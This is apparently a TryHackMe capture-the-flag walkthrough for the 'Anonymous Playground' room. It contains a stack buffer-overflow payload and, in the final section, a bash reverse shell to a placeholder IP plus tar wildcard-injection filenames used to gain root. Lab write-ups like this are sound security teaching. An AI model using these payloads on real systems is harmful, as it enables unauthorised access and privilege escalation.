# Anonymous Playground - Tryhackme

(kinda) Technical write-up about the Anonymous Playground CTF

## Recon:
I've started with a default reconnaissance using nmap:

nmap -p- -sC -sV 10.67.156.126 --min-rate 10000

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:7c:be:e6:8f:1e:dc:f9:67:65:9d:1f:2c:c3:43:bf (RSA)
|   256 2d:75:45:2f:b5:e0:f3:ff:76:db:05:aa:14:ba:f9:a5 (ECDSA)
|_  256 e8:9e:c8:c7:e3:bf:66:6a:93:3a:bf:41:7f:ae:6c:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Proving Grounds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### As we can see, we found a SSH port and a web port, but in robots.txt we can see a weird directory popping up

And if we go to the website, we'll see the main page and 'operatives' tab. But it's kinda of irrelevant now

# WEB

### Acessing the weird directory, we get a page saying 'Acess Denied'. But no worries! We can bypass that

By acessing the Developer Tools in our browser and going to "Local Storage", we'll se the cookie that manage our permissions, but just by changing the value from 'denied' to 'granted', we've bypassed the permission thing


## We came across a very very wierd looking cryptographic string, but no matter what we do... We can't decrypt with normal online tools. What do we do now?

Going to the tryhackme page, we'll se a hint for our first flag and the hint is:

"zA = a"

With that hint, we'll create a Python script that can decode that weird string. The **Python** script I've used is this one, feel free to use it:
```
import string

alphabet = string.ascii_lowercase

def decode_pair(pair):
    a, b = pair.lower()

    value = (alphabet.index(a) + 1) + (alphabet.index(b) + 1)

    value = ((value - 1) % 26) + 1

    return alphabet[value - 1]


cipher = "hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN" #remember to change this string

result = ""

for i in range(0, len(cipher), 2):
    result += decode_pair(cipher[i:i+2])

print(result)
```

**(What the code does):**
***Each letter is converted to its alphabet position (a = 1, b = 2, ..., z = 26). The two values are then added together, and modulo 26 is used to keep the result within the alphabet.***
The modulo operation also makes the alphabet wrap around. For example:

z = 26
a = 1

26 + 1 = 27
27 % 26 = 1

1 = a


After decrypting this string, we'll get the user and the password. We can use it in the SSH port!

## SSH

In the magna directory, we can get our first flag.

But inside of it, we can spot 2 files, one that is a note from spooky and the other one is hacktheworld.
In the note, he says that he's working on his skills in C, creating a type of R.E. (Reverse Engineering) and malware-related thing, but he also says that we can break his file called hacktheworld.

For that, we can use the tools that we have on the machine, which will be radare2 and GDB.

So...

## Binary exploitation

**This part takes a lot of time if you're not into binary exploitation.**


But, first of all, we need to verify what the code of this file says, so we'll be using an R.E ***(reverse engineering)*** tool of our preference.


Once we're in the C file's code, we can see that in the main function, we have a 64-byte buffer. In another function called 'call_bash', we can see that this function calls system() with /bin/sh, which will give us a shell as the spooky user.


So now, we'll try to "break" the file to identify the buffer capacity and get a 'Segmentation Fault'

The file breaks after 72 bytes (try it for yourself!):

``python -c "print('A'*72)" > something.txt``

`` ./hacktheworld < something.txt``

By doing this, we can see that the C file returned an error and it's "Segmentation Fault", which is very goof for us

Now, we'll see our functions in GDB

In case you're stuck on how to that:
```
gdb ./hacktheworld
run
info functions
```

Now, we'll search for "main" and "call_bash" again and we need to disassemble them to see what's really going on inside, so.. on GDB:

`` disas main ``

but wait.. we're seeing 2 functions (printf@plt and gets@plt), what if we put a breakpoint on them?

```
break *0x0000000000400704

break *0x0000000000400709
```
After putting two breakpoints on these functions, let's run it on gdb with our "something.txt" (or just with your .txt file that have 72 A's)

``run < something.txt``

you can type "c" (to continue) and hit enter just one time

then, type:

``info register``

We can notice that RSI is different from its original state.

If you want to compare, try creating a file with 71 A's (bytes) and another one with 72 A's (bytes), and verify the memory with:
``x/20x $rsi``

We can see that the memory contents change when we go from 71 to 72 bytes, which is a good indication that we're overwriting data beyond the buffer.

Now, we'll go to the call_bash function.

Using ``pdf @ sym.call_bash`` in radare2, we'll find that the function starts at 0x400657. Its first instruction is push rbp, followed by mov rbp, rsp at 0x400658.

Our exploit will use 0x400658 as the return address, entering the function immediately after the push rbp instruction. The address must then be represented in Little Endian byte order.

In our terminal (inside of the machine):

``python -c "print('A'*72 + '\x58\x06\x40\x00\x00\x00\x00\x00')" > something.txt``
``./hacktheworld < something.txt``

We have a different outcome and a Segmentation Fault

Now, we'll add more 2 extra zeros to our payload and a 'cat' command, to "trick" the file:

``(python -c “print(‘A’*72 + ‘\x58\x06\x40\x00\x00\x00\x00\x00’)”; cat ) | ./hacktheworld``

Finally! We escalated our privileges to the user spooky!

### Why it's not a horizontal privilege escalation?
Because the user spooky actually has more privileges than the user magna, and the hacktheworld file is owned by spooky, causing it to spawn a shell with spooky-related privileges.

### Now you have your 2nd flag! (go to /home/spooky, don't forget that, lol)

# Privelege Escalation

Now, we have something easy to do. You don't need a crazy exploit or LinPEAS for that.

### Recomendation: Try doing the privelege escalation rooms in TryHackMe (or even in other plataforms) and take notes, save these notes and make it a "checklist"

After verifying our checklist or whatever, we can actually see something very strange in /etc/crontabs. See it for yourself!

```
ls -la /etc/crontab
cat /etc/crontab
```

In the last line, we'll see that root copies all of spooky's files into /var/backup using **tar**

## Using TAR
verify the version:

``tar --version``

We'll see that the TAR version is 1.30

If you want, you can try and search for exploits, but I did like this:

```
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/youriphere/900 0>&1' >> shell.sh
chmod +x shell.sh
```

### Setup your listener, in my case, i've used netcat

and then:
```
touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=bash shell.sh'
```
**The wildcard * in the cron job gets expanded by the shell before tar receives the arguments. Because of that, filenames beginning with -- can be interpreted as tar options.**

## Just wait and you'll have the root shell!
### Now you have all the flags! (/root/)




## Lessons Learned

This room was a good reminder that knowing the concept is not the same as knowing how to execute it.

I was able to identify most of the attack paths by myself, but I got stuck on some of the practical steps, especially during the binary exploitation.
